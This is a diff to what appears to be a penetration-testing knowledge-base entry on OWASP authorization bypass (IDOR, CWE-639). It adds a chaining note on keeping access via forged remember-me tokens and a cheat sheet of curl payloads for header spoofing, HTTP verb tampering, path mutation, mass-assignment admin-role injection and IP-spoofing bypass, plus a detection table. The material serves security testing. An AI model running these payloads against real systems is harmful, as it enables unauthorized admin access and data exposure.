@@ -9,10 +9,11 @@ tags: [authorization, access-control, privilege, wstg, authz]
 tech_stack: []
 cwe_ids: [CWE-639]
 chains_with: [wstg-inpv-05, wstg-athn-05, wstg-authz-03]
-prerequisites: [wstg-athn-01]
+prerequisites: [wstg-athn-01, wstg-idnt-01, wstg-idnt-02]
 severity_boost:
   wstg-inpv-05: "IDOR + SQLi = Mass Data Breach (Critical)"
   wstg-authz-03: "IDOR + Privilege Escalation = Admin Access (Critical)"
+  wstg-athn-05: "Authorization Bypass + Vulnerable Remember-Me Token = attacker rides the bypass to mint a persistent token for any account, keeping access after the bypass is patched (Persistent Unauthorized Access, Critical)"
 ---
 
 # wstg-authz-02
@@ -471,6 +472,52 @@ print(f"\nTotal vulnerabilities: {len(vulns)}")
 | ------------------ | ----------------------- |
 | **Custom scripts** | Tailored testing        |
 | **Postman/Newman** | API authorization tests |
+
+---
+
+## Example Commands/Payloads
+
+### Quick Bypass Cheat Sheet
+
+```bash
+TOKEN="user_token"
+BASE="https://{target}"
+RESOURCE="/admin/users"
+
+# Method override headers
+curl -s "$BASE$RESOURCE" -H "Authorization: Bearer $TOKEN" -H "X-HTTP-Method-Override: GET"
+curl -s "$BASE$RESOURCE" -H "Authorization: Bearer $TOKEN" -H "X-Original-URL: $RESOURCE"
+curl -s "$BASE/" -H "Authorization: Bearer $TOKEN" -H "X-Rewrite-URL: $RESOURCE"
+
+# Verb tampering — try each in turn
+for m in GET POST PUT PATCH DELETE HEAD OPTIONS TRACE; do
+  curl -s -o /dev/null -w "$m -> %{http_code}\n" -X "$m" "$BASE$RESOURCE" -H "Authorization: Bearer $TOKEN"
+done
+
+# Path/case mutation bypass list
+for p in "$RESOURCE" "${RESOURCE^^}" "$RESOURCE/" "$RESOURCE/." "$RESOURCE%20" "$RESOURCE%2e" "/$RESOURCE" "//$RESOURCE" "${RESOURCE}.json" "${RESOURCE};.css"; do
+  curl -s -o /dev/null -w "%{http_code}  $p\n" "$BASE$p" -H "Authorization: Bearer $TOKEN"
+done
+
+# Mass-assignment role injection
+curl -s -X POST "$BASE/api/user/update" -H "Authorization: Bearer $TOKEN" \
+    -H "Content-Type: application/json" \
+    -d '{"role":"admin","is_admin":true,"permissions":["admin"],"group_id":1}'
+
+# Spoofed source-IP bypass headers
+for h in "X-Forwarded-For: 127.0.0.1" "X-Real-IP: 127.0.0.1" "X-Client-IP: 127.0.0.1" "X-Custom-IP-Authorization: 127.0.0.1"; do
+  curl -s -o /dev/null -w "%{http_code}  $h\n" "$BASE$RESOURCE" -H "Authorization: Bearer $TOKEN" -H "$h"
+done
+```
+
+### Detection Patterns
+
+| Signal                                          | Meaning                          |
+| ------------------------------------------------ | --------------------------------- |
+| `200`/`3xx` on admin path with regular-user token | Vertical bypass confirmed          |
+| Response body changes after role/is_admin injection | Mass assignment accepted         |
+| Any method returns `200` while `GET` returns `403` | Verb-based bypass                |
+| `X-Original-URL`/`X-Rewrite-URL` reveals hidden content | Reverse-proxy/router bypass  |
 
 ---
 
